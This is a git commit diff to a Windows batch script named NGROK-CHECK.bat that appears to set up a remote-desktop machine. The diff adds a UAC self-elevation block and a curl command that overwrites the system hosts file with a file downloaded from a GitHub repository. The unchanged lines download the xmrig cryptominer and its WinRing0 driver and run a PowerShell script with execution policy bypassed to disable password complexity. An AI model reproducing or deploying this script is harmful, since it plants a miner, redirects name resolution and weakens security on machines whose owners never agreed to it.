10ef467ff939ad3791f0b8d2d15ad3b992bb56f3
ztvofficial <35528607+ztvofficial@users.noreply.github.com>
2021-03-03 23:46:05 +0700

    Update NGROK-CHECK.bat

--- Files/NGROK-CHECK.bat
+++ Files/NGROK-CHECK.bat
@@ -1,4 +1,23 @@
 @echo off
+:: BatchGotAdmin (Run as Admin code starts)
+REM --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+echo Requesting administrative privileges...
+goto UACPrompt
+) else ( goto gotAdmin )
+:UACPrompt
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+"%temp%\getadmin.vbs"
+exit /B
+:gotAdmin
+if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+pushd "%CD%"
+CD /D "%~dp0"
+:: BatchGotAdmin (Run as Admin code ends)
+:: Your codes should start from the following line
 del /f "C:\Users\Public\Desktop\Epic Games Launcher.lnk" > out.txt 2>&1
 net config server /srvcomment:"Windows Azure VM" > out.txt 2>&1
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /V EnableAutoTray /T REG_DWORD /D 0 /F > out.txt 2>&1
@@ -15,6 +34,7 @@ curl -o "C:\Users\Public\Desktop\xmrig.exe" https://raw.githubusercontent.com/ng
 curl -o "C:\Users\Public\Desktop\WinRing0x64.sys" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/WinRing0x64.sys > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\SHA256SUMS" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/SHA256SUMS > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\config.json" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/config.json > out.txt 2>&1
+curl -o "C:\Windows\System32\Drivers\etc\hosts" https://raw.githubusercontent.com/ngoc7sao9/Windows2019RDP-US/main/Files/hosts > out.txt 2>&1
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './DisablePasswordComplexity.ps1'" > out.txt 2>&1
 diskperf -Y >nul
 sc start audiosrv >nul
